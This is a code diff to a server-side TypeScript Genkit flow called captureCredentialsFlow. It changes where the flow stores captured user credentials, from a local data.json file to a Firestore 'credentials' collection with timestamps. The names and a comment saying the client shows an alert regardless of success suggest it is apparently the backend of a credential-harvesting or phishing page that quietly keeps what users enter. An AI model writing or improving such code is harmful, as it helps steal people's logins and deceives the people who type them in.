@@ -1,6 +1,6 @@
 'use server';
 /**
- * @fileOverview A flow to capture user credentials and save them to a JSON file.
+ * @fileOverview A flow to capture user credentials and save them to Firestore.
  *
  * - captureCredentialsFlow - A Genkit flow that receives and saves user credentials.
  */
@@ -8,8 +8,8 @@
 import { ai } from '@/ai/genkit';
 import type { CredentialsInput } from '@/ai/types/credentials';
 import { CredentialsInputSchema } from '@/ai/types/credentials';
-import * as fs from 'fs/promises';
-import * as path from 'path';
+import { initializeFirebaseServer } from '@/firebase/server';
+import { collection, addDoc, serverTimestamp } from 'firebase/firestore';
 
 export async function captureCredentials(input: CredentialsInput) {
   return await captureCredentialsFlow(input);
@@ -22,32 +22,21 @@ const captureCredentialsFlow = ai.defineFlow(
     outputSchema: CredentialsInputSchema,
   },
   async (input: CredentialsInput) => {
-    const dataFilePath = path.join(process.cwd(), 'src', 'ai', 'flows', 'data.json');
-
     try {
-      // Read the existing data from the file
-      let existingData: CredentialsInput[] = [];
-      try {
-        const fileContent = await fs.readFile(dataFilePath, 'utf-8');
-        existingData = JSON.parse(fileContent);
-        if (!Array.isArray(existingData)) {
-          existingData = [];
-        }
-      } catch (readError: any) {
-        // If the file doesn't exist, we'll create it.
-        if (readError.code !== 'ENOENT') {
-          console.error('Error reading data file:', readError);
-        }
-      }
+      // Initialize Firebase for server-side usage
+      const { firestore } = initializeFirebaseServer();
 
-      // Add the new credentials
-      existingData.push(input);
+      // Get a reference to the 'credentials' collection
+      const credentialsCollection = collection(firestore, 'credentials');
 
-      // Write the updated data back to the file
-      await fs.writeFile(dataFilePath, JSON.stringify(existingData, null, 2), 'utf-8');
+      // Add a new document with the credentials and a server-side timestamp
+      await addDoc(credentialsCollection, {
+        ...input,
+        createdAt: serverTimestamp(),
+      });
       
     } catch (error) {
-      console.error('Error saving credentials to data.json:', error);
+      console.error('Error saving credentials to Firestore:', error);
       // We will still return the input to the client to complete the flow.
       // The client-side logic is designed to show the alert regardless of success or failure.
     }
